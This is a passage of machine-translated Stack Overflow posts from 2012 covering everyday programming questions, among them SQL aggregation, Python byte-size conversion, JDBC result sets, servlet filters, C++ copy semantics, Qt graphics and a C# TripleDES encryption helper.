  active tinyint(1) NOT NULL,
  lecture_id int(11) NOT NULL,
  PRIMARY KEY (_id)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ; 
```

查询返回数据，女巫可在此处获得：http: [//pastebin.com/80KNsU7Y](http://pastebin.com/80KNsU7Y)

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T12:46:22.683

我添加了几个索引，可以加快以这种方式编写的查询。他们也可能对原件有所帮助。[http://sqlfiddle.com/#!2/bdcf8/1](http://sqlfiddle.com/#!2/bdcf8/1)

```
Select
  Sum(Case When w.Active = 1 Then 1 Else 0 End) As active_word_count,
  Count(w._id) As word_count,
  Count(Distinct l._id) As lecture_count,
  b._id,
  b.name,
  b.version
From
  Book b
    Left Outer Join
  Lecture l
    On l.book_id = b._id
    Left Outer Join
  Word w
    On w.lecture_id = l._id
Group By
   b._id,
   b.name,
   b.version 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T13:03:34.237

我添加了一些 JOIN。所以现在应该更快了。[http://sqlfiddle.com/#!2/eec80/15](http://sqlfiddle.com/#!2/eec80/15)

```
SELECT
    (SELECT COUNT(*)
        FROM word w
        JOIN lecture l ON l._id = w.lecture_id
        WHERE l.book_id = b._id
        AND w.active = 1) AS active_word_count,
    (SELECT COUNT(*)
        FROM word w
        JOIN lecture l ON  w.lecture_id = l._id
        WHERE l.book_id = b._id) AS word_count,
    (SELECT COUNT(*)
        FROM lecture l
        WHERE l.book_id = b._id) AS lecture_count,
    b._id,
    b.name,
    b.version
FROM book b 
```

# python - 字节到人类可读，然后返回。无数据丢失

> ID：13343700
> 
> 赞同：9
> 
> 时间：2012-11-12T12:28:05.930
> 
> 标签：python, memory, converter, human-readable

我需要将包含以字节为单位的内存使用情况的字符串（例如：`1048576`（1M））转换为人类可读的版本，反之亦然。

*注意*：我已经看过这里了： [Reusable library to get human readable version of file size?](https://stackoverflow.com/questions/1094841/reusable-library-to-get-human-readable-version-of-file-size)

在这里（即使它不是python）： [如何将人类可读的内存大小转换为字节？](https://stackoverflow.com/questions/6974614/how-to-convert-human-readable-memory-size-into-bytes)

到目前为止没有任何帮助，所以我在别处寻找。

我在这里找到了对我有用的东西：[http](http://code.google.com/p/pyftpdlib/source/browse/trunk/test/bench.py?spec=svn984&r=984#137) ://code.google.com/p/pyftpdlib/source/browse/trunk/test/bench.py​​?spec=svn984&r=984#137或者，对于较短的 URL：[http://goo.gl/zeJZl](http://goo.gl/zeJZl)

编码：

```
def bytes2human(n, format="%(value)i%(symbol)s"):
    """
    >>> bytes2human(10000)
    '9K'
    >>> bytes2human(100001221)
    '95M'
    """
    symbols = ('B', 'K', 'M', 'G', 'T', 'P', 'E', 'Z', 'Y')
    prefix = {}
    for i, s in enumerate(symbols[1:]):
        prefix[s] = 1 << (i+1)*10
    for symbol in reversed(symbols[1:]):
        if n >= prefix[symbol]:
            value = float(n) / prefix[symbol]
            return format % locals()
    return format % dict(symbol=symbols[0], value=n) 
```

还有一个以其他方式进行转换的功能（同一站点）：

```
def human2bytes(s):
    """
    >>> human2bytes('1M')
    1048576
    >>> human2bytes('1G')
    1073741824
    """
    symbols = ('B', 'K', 'M', 'G', 'T', 'P', 'E', 'Z', 'Y')
    letter = s[-1:].strip().upper()
    num = s[:-1]
    assert num.isdigit() and letter in symbols
    num = float(num)
    prefix = {symbols[0]:1}
    for i, s in enumerate(symbols[1:]):
        prefix[s] = 1 << (i+1)*10
    return int(num * prefix[letter]) 
```

这很好，但它有一些信息丢失，例如：

```
>>> bytes2human(10000)
'9K'
>>> human2bytes('9K')
9216 
```

为了解决这个问题，我更改了函数的格式`bytes2human`

进入：`format="%(value).3f%(symbol)s")`

哪个更好，给我这些结果：

```
>>> bytes2human(10000)
'9.766K' 
```

但是当我尝试使用`human2bytes`函数将它们转换回来时：

```
>>> human2bytes('9.766K')

Traceback (most recent call last):
  File "<pyshell#366>", line 1, in <module>
    human2bytes('9.766K')
  File "<pyshell#359>", line 12, in human2bytes
    assert num.isdigit() and letter in symbols
AssertionError 
```

这是因为`.`

**所以我的问题是，我怎样才能将人类可读的版本转换回字节版本，而不会丢失数据？**

*注意*：我知道小数点后 3 位也有一点数据丢失。但是出于这个问题的目的，让我们暂时忽略这一点，我总是可以将其更改为更大的东西。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-19T07:47:23.693

所以事实证明答案比我想象的要简单得多 - 我提供的链接之一实际上导致了该[函数](http://code.activestate.com/recipes/578019-bytes-to-human-human-to-bytes-converter/?in=user-4178764)的更详细版本：

它能够处理我给它的任何范围。

但是感谢您的帮助：

此处复制的代码供后人使用：

```
## {{{ http://code.activestate.com/recipes/578019/ (r15)
#!/usr/bin/env python

"""
Bytes-to-human / human-to-bytes converter.
Based on: http://goo.gl/kTQMs
Working with Python 2.x and 3.x.

Author: Giampaolo Rodola' <g.rodola [AT] gmail [DOT] com>
License: MIT
"""

# see: http://goo.gl/kTQMs
SYMBOLS = {
    'customary'     : ('B', 'K', 'M', 'G', 'T', 'P', 'E', 'Z', 'Y'),
    'customary_ext' : ('byte', 'kilo', 'mega', 'giga', 'tera', 'peta', 'exa',
                       'zetta', 'iotta'),
    'iec'           : ('Bi', 'Ki', 'Mi', 'Gi', 'Ti', 'Pi', 'Ei', 'Zi', 'Yi'),
    'iec_ext'       : ('byte', 'kibi', 'mebi', 'gibi', 'tebi', 'pebi', 'exbi',
                       'zebi', 'yobi'),
}

def bytes2human(n, format='%(value).1f %(symbol)s', symbols='customary'):
    """
    Convert n bytes into a human readable string based on format.
    symbols can be either "customary", "customary_ext", "iec" or "iec_ext",
    see: http://goo.gl/kTQMs

      >>> bytes2human(0)
      '0.0 B'
      >>> bytes2human(0.9)
      '0.0 B'
      >>> bytes2human(1)
      '1.0 B'
      >>> bytes2human(1.9)
      '1.0 B'
      >>> bytes2human(1024)
      '1.0 K'
      >>> bytes2human(1048576)
      '1.0 M'
      >>> bytes2human(1099511627776127398123789121)
      '909.5 Y'

      >>> bytes2human(9856, symbols="customary")
      '9.6 K'
      >>> bytes2human(9856, symbols="customary_ext")
      '9.6 kilo'
      >>> bytes2human(9856, symbols="iec")
      '9.6 Ki'
      >>> bytes2human(9856, symbols="iec_ext")
      '9.6 kibi'

      >>> bytes2human(10000, "%(value).1f %(symbol)s/sec")
      '9.8 K/sec'

      >>> # precision can be adjusted by playing with %f operator
      >>> bytes2human(10000, format="%(value).5f %(symbol)s")
      '9.76562 K'
    """
    n = int(n)
    if n < 0:
        raise ValueError("n < 0")
    symbols = SYMBOLS[symbols]
    prefix = {}
    for i, s in enumerate(symbols[1:]):
        prefix[s] = 1 << (i+1)*10
    for symbol in reversed(symbols[1:]):
        if n >= prefix[symbol]:
            value = float(n) / prefix[symbol]
            return format % locals()
    return format % dict(symbol=symbols[0], value=n)

def human2bytes(s):
    """
    Attempts to guess the string format based on default symbols
    set and return the corresponding bytes as an integer.
    When unable to recognize the format ValueError is raised.

      >>> human2bytes('0 B')
      0
      >>> human2bytes('1 K')
      1024
      >>> human2bytes('1 M')
      1048576
      >>> human2bytes('1 Gi')
      1073741824
      >>> human2bytes('1 tera')
      1099511627776

      >>> human2bytes('0.5kilo')
      512
      >>> human2bytes('0.1  byte')
      0
      >>> human2bytes('1 k')  # k is an alias for K
      1024
      >>> human2bytes('12 foo')
      Traceback (most recent call last):
          ...
      ValueError: can't interpret '12 foo'
    """
    init = s
    num = ""
    while s and s[0:1].isdigit() or s[0:1] == '.':
        num += s[0]
        s = s[1:]
    num = float(num)
    letter = s.strip()
    for name, sset in SYMBOLS.items():
        if letter in sset:
            break
    else:
        if letter == 'k':
            # treat 'k' as an alias for 'K' as per: http://goo.gl/kTQMs
            sset = SYMBOLS['customary']
            letter = letter.upper()
        else:
            raise ValueError("can't interpret %r" % init)
    prefix = {sset[0]:1}
    for i, s in enumerate(sset[1:]):
        prefix[s] = 1 << (i+1)*10
    return int(num * prefix[letter])

if __name__ == "__main__":
    import doctest
    doctest.testmod()
## end of http://code.activestate.com/recipes/578019/ }}} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-12T12:45:52.673

你在最后一个笔记中几乎回答了你自己的问题，那里。

在`human2bytes(s)`中，输入字符串——`9.766K`例如——被分成两部分，数字和前缀。在断言之后（正如您正确观察到的是引发错误的原因），该数字乘以前缀表示的相应值，因此`9.766 * 1000 = 9766`. “避免”数据丢失的唯一方法是接受足够精确的浮点值作为输入。

为了`human2bytes`接受浮点输入，您可以`num.isdigit()`从断言中删除，然后`num = float(num)`用 try-except 包装类型转换，或者[通过其他方式检查它](https://stackoverflow.com/questions/736043/checking-if-a-string-can-be-converted-to-float-in-python)。

# objective-c - 应用 removeObjectAtIndex 与可变复制数组中的 appendString 具有不同的范围

> ID：13343701
> 
> 赞同：1
> 
> 时间：2012-11-12T12:28:09.193
> 
> 标签：objective-c

使用 mutableCopy 复制 NSMutableArray 显然会创建该数组的物理新副本。这一点的证据是使用 removeObjectAtIndex 从副本中删除元素不会从原始元素中删除元素。但是，如果副本中的元素发生更改，则原始元素中的元素也会更改。这就像光的光子既是粒子又是波一样直观，我不明白。请有人可以向我解释一下。

代码如下。

```
NSMutableArray *dataArray = [NSMutableArray arrayWithObjects:
                                 [NSMutableString stringWithString:@"one"],
                                 [NSMutableString stringWithString:@"two"],
                                 [NSMutableString stringWithString:@"three"],
                                 [NSMutableString stringWithString:@"four"],
                                 nil];
    NSMutableArray *dataArray2;
    NSMutableString *mstr;
    dataArray2 = [dataArray mutableCopy];
    [dataArray2 removeObjectAtIndex:0];
    mstr    = [dataArray2 objectAtIndex:0];
    [mstr appendString:@"ONE"];
    NSLog(@"Data Array: ");
    for (NSString *elem in dataArray) {
        NSLog(@"%@",elem);
    }
    NSLog(@"Data Array2: ");
    for (NSString *elem in dataArray2) {
        NSLog(@"%@",elem);
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:33:37.917

该`mutableCopy`方法创建数组的[*浅表副本*](http://en.wikipedia.org/wiki/Object_copy#Shallow_copy)，这意味着对原始数组元素的引用被复制到由`NSMutableArray`返回的新实例中`mutableCopy`。这就是为什么操作（添加/删除元素）数组的副本不会改变原始数组的组成，而允许突变的数组*元素的更改通过数组的两个副本变得“可见”。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:34:19.313

这是您是更改数组对象还是它引用的对象之一的问题。

假设在非计算机世界中，您在两张不同的纸上都有人名列表。如果您从一个列表中删除名称，它对另一个列表没有影响。相反，如果您给其中一个人一杯咖啡，那么无论您是在列表 A 还是列表 B 上查找他们，这个人都会拥有它。:-)

# java - 如何创建可滚动的结果集？

> ID：13343703
> 
> 赞同：3
> 
> 时间：2012-11-12T12:28:16.243
> 
> 标签：java, sql, jdbc, sqlexception, scrollable

我得到了这个简单的代码来从 MSSQL Server 2008 检索记录集，由于我设置了 ResultSet.TYPE_SCROLL_INSENSITVE，因此它必须是可滚动的，与 Javadocs 中的示例相同：

```
String qry = "SELECT * from tblPeople";
SQLConnection sql = new SQLConnection();
Statement stmt = sql.getConnection().createStatement(
                                        ResultSet.TYPE_SCROLL_INSENSITIVE,
                                        ResultSet.CONCUR_UPDATABLE);
ResultSet rs = stmt.executeQuery(qry); 
```

不幸的是，当我想获得如下行数时，我仍然得到了这个堆栈跟踪`rs.last(); int rowCount = rs.getRow();`：

```
java.sql.SQLException: ResultSet may only be accessed in a forward direction.
    at net.sourceforge.jtds.jdbc.JtdsResultSet.checkScrollable(JtdsResultSet.java:304)
    at net.sourceforge.jtds.jdbc.JtdsResultSet.last(JtdsResultSet.java:551)
    at test.personen.Main.main(Main.java:44) 
```

为什么会这样，我该如何解决（顺便说一下，当我检查 ResultSet 的类型时，我得到 1003 ..）？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T12:40:14.993

很可能与 的组合`TYPE_SCROLL_INSENSITIVE`不兼容`CONCUR_UPDATABLE`。根据 JDBC 规范，如果驱动程序`ResultSet`不能为请求的可滚动性和/或并发模式提供服务，它可以自由降级。另见： http: [//jtds.sourceforge.net/resultSets.html](http://jtds.sourceforge.net/resultSets.html)：

> TYPE_SCROLL_INSENSITIVE | 静态光标 | 重 | 仅适用于只读并发（可更新已降级）。SQL Server 会生成一个临时表，因此其他人所做的更改是不可见的。可滚动。

这确认了驱动程序将在指定时降级`CONCUR_UPDATABLE`。

您可能要考虑使用`TYPE_SCROLL_SENSITIVE`或干脆不将可滚动性与可更新性结合起来。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T12:43:30.103

jTDS TYPE_SCROLL_INSENSITIVE 只支持只读操作。

将 ResultSet.TYPE_SCROLL_INSENSITIVE 更改为 ResultSet.TYPE_SCROLL_SENSITIVE

见[http://www.anyang-window.com.cn/jtds-on-the-database-connection-resultset-is-read-only/](http://www.anyang-window.com.cn/jtds-on-the-database-connection-resultset-is-read-only/)

# python-sphinx - 在 sphinx 文档中包含长 url

> ID：13343705
> 
> 赞同：6
> 
> 时间：2012-11-12T12:28:20.330
> 
> 标签：python-sphinx

我是狮身人面像的新手。很抱歉，如果这是非常基本的问题。

我有一个很长的网址，我想将其包含在我的文档中。如果我只是在我的文档中包含链接，它看起来很丑，因为它太长了

我试过，把它放在一个盒子里

> 点击以下链接::
> 
> ```
>  http://my_very_looooooooooooooooooooooog_url 
> ```

然后，它看起来好多了，因为它只在一行上，但它不再是可点击的。

我该怎么做才能让它可点击并在一行上？

谢谢您的帮助

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-12T16:28:37.877

您可以使用 reStructuredText 中可用的任何一种超链接结构。一个示例是使用*嵌入式 URI*，如 reStructuredText 规范中定义的那样（例如，参见[快速参考](http://docutils.sourceforge.net/docs/user/rst/quickref.html#external-hyperlink-targets)），编写：

```
External hyperlinks, like `Python <http://www.python.org/>`_. 
```

呈现如下：

> 外部超链接，例如[Python](http://www.python.org/)。

# javascript - 将 console.log 与管道一起使用

> ID：13343707
> 
> 赞同：0
> 
> 时间：2012-11-12T12:28:23.433
> 
> 标签：javascript, firebug, conduit

我正在尝试调试在管道工具栏上运行的用 javascript 编写的脚本。现在我正在简单地使用

```
window.alert("function x is working"); 
```

但这在脚本变大时出现许多警报的情况下非常令人不安。我更愿意将日志或调试消息写入 FireBug 或 Chrome 的控制台，其中：

```
console.log("function x is working"); 
```

因为这更合理，但是当从我包含在管道工具栏上的 html 组件中的 javascript 文件运行此代码时，此代码无效。
我真的尝试过使用管道工具栏 api 研究这个和类似的问题，但我发现它们在堆栈上并不是真正常见的主题.. 有人知道论坛或管道 api 使用的良好信息资源吗？他们的官方页面对我来说有点混乱。

真的很感谢任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:59:39.937

无法在此处获得有关 Conduit 工具栏 API 的更多信息。这是我想到的解决方法，希望这可以帮助其他人。

```
var writeToConsoleScriptStr = 'console.log("your message here");';
JSInjection(writeToConsoleScriptStr); 
```

如果您还需要使用与您的页面相关的其他事项，这将很有帮助，例如在标签集中/模糊时使用 Jquery 运行代码。顺便说一句，在我检查过的所有浏览器上都运行了对控制台的写入和用于选项卡切换事件的 JQuery，这是一个很好的接触。
当然，为了运行 Jquery，实际页面需要页面包含 jquery，您也可以通过相同的方式注入它来实现。（以一定的代价）

我希望这可以帮助某人。

# json - 如何在 Windows Phone 中提取 json 响应？

> ID：13343710
> 
> 赞同：1
> 
> 时间：2012-11-12T12:28:38.170
> 
> 标签：json, windows-phone-7, windows-phone-7.1

我有以下想要提取的 json 响应。我以前从未使用过 json 概念。只想知道如何使用 DataContractJsonSerializer 提取下面的 json 响应，以便我可以提取长名、短名或任何其他级别的属性。

[http://maps.googleapis.com/maps/api/geocode/json?latlng=40.714224,-73.961452&sensor=true](http://maps.googleapis.com/maps/api/geocode/json?latlng=40.714224,-73.961452&sensor=true)

我编写的代码不返回元素值：

```
 var ms = new MemoryStream(Encoding.Unicode.GetBytes(e.Result));
        DataContractJsonSerializer stdserialize = new DataContractJsonSerializer(typeof(Address));
        Address stuser = (Address)stdserialize.ReadObject(ms);

   //############################################################################################################################
    [DataContract]
    public class Address
    {
        [DataMember(Name = "long_name")]
        public string address1;
        [DataMember(Name = "short_name")]
        public string shortaddress;
        [DataMember(Name = "formatted_address")]
        public string formattedtaddress;
        [DataMember(Name = "lat")]
        public string latitude;
        [DataMember(Name = "long")]
        public string latitude;
    }
    //##############################################################################################################################
    [DataContract]
    public class result
    {
        [DataMember(Name = "results")]
        public string totalResult { get; set; }
        [DataMember(Name = "address_components")]
        public Dictionary<string, Address> merchants { get; set; }
    }
//################################################################################################################### 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T14:20:38.307

首先，我建议使用 Json.net 进行反序列化，它易于使用，具有 WP 版本，并且比 DataContractJsonSerializer 快很多倍 - 请参阅[http://json.codeplex.com/](http://json.codeplex.com/)。

此外，尝试使用类似 Pretty Json for Chrome 的浏览器插件（https://chrome.google.com/webstore/detail/pretty-json/ddngkjbldiejbheifcmnfmmfiniimbbg），当您访问 json url 时，可以更轻松地阅读 json 结构你的浏览器。

但是，如果您确实坚持使用 DataContractJsonSerializer，那么您就走在了正确的轨道上。您只需要将您的类与 Json 的结构相匹配（该插件会帮助您）。最外面的对象包含地址列表和文本状态：

```
[DataContract]
public class Result
{
    [DataMember(Name = "status")]
    public string Status { get; set; }

    [DataMember(Name = "results")]
    public Address[] Results { get; set; }
} 
```

那么每个地址对象都是这样的：

```
[DataContract]
public class Address
{
    [DataMember(Name = "formatted_address")]
    public string FormattedAddress;

    [DataMember(Name = "address_components")]
    public AddressComponent[] AddressComponents;
} 
```

他们有一个地址组件列表，如下所示：

```
[DataContract]
public class AddressComponent
{
    [DataMember(Name = "long_name")]
    public string LongName;

    [DataMember(Name = "short_name")]
    public string ShortName;

    [DataMember(Name = "types")]
    public string Types;
} 
```

要包括 long/lat，您必须将另一个类作为其另一个级别，例如几何 -> 位置。

然后您可以反序列化到最外面的对象，如下所示：

```
 var ms = new MemoryStream(Encoding.Unicode.GetBytes(e.Result));
    DataContractJsonSerializer stdserialize = new DataContractJsonSerializer(typeof(Result));
    Result res = (Result)stdserialize.ReadObject(ms); 
```

然后你可以看一下`res.Results`要遍历的每个地址

# java - java中控制在什么条件下从Filter传递到Servlet？

> ID：13343713
> 
> 赞同：1
> 
> 时间：2012-11-12T12:28:42.650
> 
> 标签：java, servlets, servlet-filters

我有在 JBOSS 中运行的服务器。有一个监听所有请求，即所有请求都到达过滤器并从这里`Filter`传递给其他请求。`Servlets`我注意到了这一点：

当我使用以下代码时，仅调用了过滤器，但控制权没有传递给相应的 Servlet（当我使用 打印时，过滤器打印正确的 servlet `request.getRequestURI()`。它还打印请求标头的正确值`username`和`password`)

```
 HttpURLConnection connection=gs.getconnection("send_user_detail");
          connection.setRequestProperty("user", gs.get_login_id());
          connection.setRequestProperty("password", gs.get_pass());
        connection.setRequestProperty("timezone", TimeZone.getDefault().getDisplayName());
            connection.connect(); 
```

**但是**当我使用下面的代码时，控件会传递给相应的`Servlet`并且工作正常。

```
 HttpURLConnection connection=gs.getconnection("send_user_detail");
          connection.setRequestProperty("user", gs.get_login_id());
          connection.setRequestProperty("password", gs.get_pass());
        connection.setRequestProperty("timezone", TimeZone.getDefault().getDisplayName());
            //connection.connect();
 ObjectOutputStream out=new ObjectOutputStream(connection.getOutputStream());
          out.writeObject("string"); //some random string not used in the servlet 
```

因此，只有当我在 OutputStream 上写一些东西时，控制才会传递给 servlet。但是`connection.connect()`，它仍然上升到过滤器，甚至打印出请求的正确名称`Servlet`。是什么原因？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:49:58.467

写入请求正文`URLConnection`意味着一个 HTTP POST 请求。

您的 servlet 显然是在做这项工作`doPost()`，而不是在`doGet()`.

`doGet()`如果您希望您的 servlet 对 HTTP GET 请求采取行动，您需要执行该工作。

这与过滤器完全无关。卸下过滤器时，您会遇到完全相同的问题。

* * *

**与具体问题**无关**`connection.setRequestProperty()`，这些行设置请求标头，而不是请求参数。确保您没有滥用标头作为参数（糟糕的设计）。在 POST 的情况下，请求参数应写为请求正文中的 URL 编码查询字符串。**

 **### 也可以看看：

*   [使用 java.net.URLConnection 触发和处理 HTTP 请求](https://stackoverflow.com/questions/2793150/how-to-use-java-net-urlconnection-to-fire-and-handle-http-requests)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:37:11.503

过滤器在一个链中工作。过滤器合约是；

```
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException 
```

通常，过滤器会做一些工作并调用

```
chain.doFilter(request, response); 
```

请注意，过滤器可以在过滤器链调用之前或之后完成其工作。调用之前的代码在进入的途中被调用，在 servlet 之前。调用之后的代码在 servlet 之后的出路中被调用。

注意链中可以有很多过滤器，并且链是有序的。链中的任何过滤器都可能错过过滤器链调用，这会阻止请求进一步向上传播并最终到达 servlet。

我怀疑在你的情况下这可能是正在发生的事情。

编辑：
刚刚注意到，在您的第二个示例中，您已经注释掉了对`connection.connect();`可能这在第一个示例中引发错误的调用？**

# c++ - 我可以为 const 和非常量实例编写不同的 copyCtor 吗？

> ID：13343718
> 
> 赞同：7
> 
> 时间：2012-11-12T12:29:15.787
> 
> 标签：c++, copy-constructor, deep-copy, shallow-copy

我有以下问题：

我有一堂课应该这样做：

```
Obj o;
Obj o1(o), o1=o; // deep-copies
const Obj c(o), c=o; // deep-copies
const Obj c1(c), c1=c; // shallow-copies
Obj o2(c), o2=c; // deep-copies 
```

我怎样才能在没有继承的情况下最好地做到这一点？（我的意思是我会`Const_obj`从其他地方继承`Obj`。）

编辑：

直接使用`o.clone()`不是一种选择，因为这样我很容易通过意外*不*克隆来引入错误。

编辑：

**最后，使用Scott Meyers**的 Effective C++ 中的思想，有一个适当的、完整的解决方案，其中包含惰性求值。在下面查看我的答案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T12:33:58.313

不，你不能。

*   构造函数不能是 cv 限定的，所以你不能强制它构造一个 const 对象。
*   函数的返回类型（包括运算符）不是其签名的一部分，因此您不能仅通过更改函数的返回类型来重载函数。

另外，如果可能的话，我会觉得这*真的很*令人困惑。只需制作适合您需要的方法，并以明确的方式命名它们。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-14T17:35:07.207

在阅读**Scott Meyers**的 Effective C++ 之后，以下是一个解决方案：

定义一个执行惰性评估的模板（使用引用计数）：

```
class Obj : private lazy<Obj_data>{}; 
```

并且惰性存储 Obj_data 私有，具有受保护的访问器，一个用于修改，一个用于只读访问。
如果需要，修饰符访问器首先对数据进行深度复制`Obj_data`，然后移交对数据的引用。只读访问器只返回一个 const 引用。

这样做的总成本是存储 2 个额外的指针（一个用于数据，一个用于计数器）和一个计数器。

实现是这样的：

```
class lazy{
protected:
  lazy(const lazy&obj){lazy_copy(obj);}
  //(the required constructors, operator= ...)

  // accessors:
  const Obj_data& data() const {return *od;}
  Obj_data& mod_data() {make_private(); return *od;}
private:
  void lazy_copy(const lazy& obj);
  void make_private(); // this does the actual deep-copy, as late as possible.
private:
  counter*;
  Obj_data* od;
}; 
```

因此，读取和修改 gos 的`Obj`属性

```
void Obj::method(){
   cout << data().some_attribute;    // simple read
   mod_data().i = 10;                // simple modify
   const Obj_data& const_d = data(); // assignable for lots of read-outs
   Obj_data& var_d = mod_data();     // assignable for lots of modifications.
} 
```

请注意，您只能`data()`将`const`成员用作`mod_data()`类中的非常量函数，因此此解决方案是完全安全的，开销很小。

理论背景：问题中期望的行为是一个实现细节，与客户端无关。因此我们通过私有继承来解决它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T12:39:28.290

您可以部分地使用虚拟参数：

```
class C {
public:
    struct NonStandardCopy { };

    C (const C &) {
        // "ordinary" copy constructor with default behavior
    }

    C (const C &, NonStandardCopy) {
        // "other" "copy" constructor
    }
};

C c = c1; // default
C c (c1); // default
C c (c1, C::NonStandardCopy ()); // non-default 
```

编辑：仅克隆方法可能是您想要的（与移动语义一起，性能影响可能不会太大）：

```
class C {
private:
    struct DeepCopy { };
    struct ShallowCopy { };

    C (const C &) = delete;

    C (const C &, DeepCopy) {
        // deep copy
    }

    C (const C &, ShallowCopy) {
        // shallow copy
    }
public:
    // move constructor
    C (C && other) = default;

    const C clone () const { // 1
        // shallow copy
        return C (*this, ShallowCopy ());
    }

    C cloneToNonConst () const {  // 2
        // deep copy
        return C (*this, DeepCopy ());
    }

    C clone () { // 3
        return cloneToNonConst ();
    }
};

C o;
C o1 = o.clone (); // call 3
const C o2 = o1.clone (); // call 3
const C o3 = o2.clone (); // call 1
C c4 = o3.cloneToNonConst (); // call 2; o3.clone () will give error 
```

# asp.net - 在 Excel 单元格中允许超过 15 位数字

> ID：13343721
> 
> 赞同：1
> 
> 时间：2012-11-12T12:29:26.427
> 
> 标签：asp.net, export-to-excel

如何在.NET中将数据导出到excel时允许在excel单元格中输入超过15位数字

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:39:25.833

您需要获取单元格引用并将其格式更改为数字。

C# 示例；

```
myRange.NumberFormat = "0.0"; 
```

# python - 三角形或饼图的边界矩形

> ID：13343724
> 
> 赞同：2
> 
> 时间：2012-11-12T12:29:31.263
> 
> 标签：python, qt, rectangles, bounding, pie-chart

我有一个问题，我有这些“饼片”，每个都需要可选，但由于 Qt 的性质，似乎每个只能有一个边界矩形。我需要某种三角形。使用矩形意味着每个切片的矩形将与其他切片矩形重叠，或者每个矩形必须缩小以适合切片，这将在切片中留下很多其他空白空间。

有任何想法吗？

![馅饼切片图像](../Images/05a485f8500d2b35da0c637ff5207229.png) 如果有帮助，这是我为生成切片而创建的类：

```
class Link_Point(QGraphicsItem):
    """ Connection points for object link """
    RECT                = Component_Point.RECT.adjusted(BORDER_WIDTH/2, BORDER_WIDTH/2, -BORDER_WIDTH/2, -BORDER_WIDTH/2)

    def __init__(self, type, parent=None):
        super(Link_Point, self).__init__(parent)

        # Vars
        self.type       = type
        self.start_angle= 0
        self.span       = 0

        # Settings
        self.setFlags(  QGraphicsItem.ItemIsSelectable  |
                        QGraphicsItem.ItemIsMovable | # ********* remove this line
                        QGraphicsItem.ItemIsFocusable   )

    def Set_Span(self, start_angle, span):
        self.start_angle= start_angle
        self.span       = span
        self.update()

    def boundingRect(self):
        # *** set bounding rect propperly
        return Component_Point.RECT

    def paint(self, painter, option, widget):
        # Draw Pie Slice
        pen = QPen()
        pen.setStyle(Qt.NoPen)
        painter.setPen(pen)
        brush   = QBrush(LINKCOLOR_DIC[self.type])
        painter.setBrush(brush)
        painter.drawPie(Link_Point.RECT, self.start_angle, self.span) 
```

# c# - CryptographicException - 错误数据

> ID：13343725
> 
> 赞同：1
> 
> 时间：2012-11-12T12:29:31.510
> 
> 标签：c#, winforms, cryptography

我开发了一个使用加密的 WinForms 解决方案。

我遇到的问题之一是处理空密码（例如没有设置密码）。显然，空字符串会导致加密异常，所以我试图阻止加密/解密字符串，如果它是空的，并将它的值设置为空字符串。

但是，我得到了异常： CryptoGraphic Exception (Bad Data)。

这是堆栈跟踪：

在 System.Security.Cryptography.CryptographicException.ThrowCryptographicException(Int32 hr) 在 System.Security.Cryptography.Utils._DecryptData(SafeKeyHandle hKey, Byte[] data, Int32 ib, Int32 cb, Byte[]& outputBuffer, Int32 outputOffset, PaddingMode PaddingMode , Boolean fDone) 在 System.Security.Cryptography.CryptoAPITransform.TransformFinalBlock(Byte[] inputBuffer, Int32 inputOffset, Int32 inputCount) 在 xxx.Security.Cryptography.Decrypt(String cipherString, Boolean useHashing) 在 C:\xxxx\xxxx\xxxx \xxxx\xxxx\xxxx\Cryptography.cs：第 82 行

这是该类的源代码：

```
using System;
using System.Security.Cryptography;
using System.Text;

namespace xxx
{
  public class Cryptography
  {
    private const string key = "xxxx";

    public static string Encrypt(string toEncrypt, bool useHashing)
    {
        if (toEncrypt == "")
        {
            string result = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(toEncrypt));
            return result;
        }
        else
        {
            try
            {
                byte[] keyArray;
                byte[] toEncryptArray = Encoding.UTF8.GetBytes(toEncrypt);

                //If hashing use get hashcode regards to your key
                if (useHashing)
                {
                    MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
                    keyArray = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(key));
                    md5CryptoServiceProvider.Clear();
                }
                else
                    keyArray = Encoding.UTF8.GetBytes(key);

                TripleDESCryptoServiceProvider tripleDesCryptoServiceProvider = new TripleDESCryptoServiceProvider();
                //set the secret key for the tripleDES algorithm
                tripleDesCryptoServiceProvider.Key = keyArray;
                //mode of operation. there are other 4 modes.
                //We choose ECB(Electronic code Book)
                tripleDesCryptoServiceProvider.Mode = CipherMode.ECB;
                //padding mode(if any extra byte added)

                tripleDesCryptoServiceProvider.Padding = PaddingMode.PKCS7;

                ICryptoTransform cTransform = tripleDesCryptoServiceProvider.CreateEncryptor();
                //transform the specified region of bytes array to resultArray
                byte[] resultArray =
                  cTransform.TransformFinalBlock(toEncryptArray, 0,
                  toEncryptArray.Length);
                //Release resources held by TripleDes Encryptor
                tripleDesCryptoServiceProvider.Clear();
                //Return the encrypted data into unreadable string format
                return Convert.ToBase64String(resultArray, 0, resultArray.Length);
            }
            catch (Exception)
            {
                string result = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(toEncrypt));
                return result;
            }
        }
    }

    public static string Decrypt(string cipherString, bool useHashing)
    {
        if (cipherString == "")
        {
            UTF8Encoding utf8 = new UTF8Encoding();
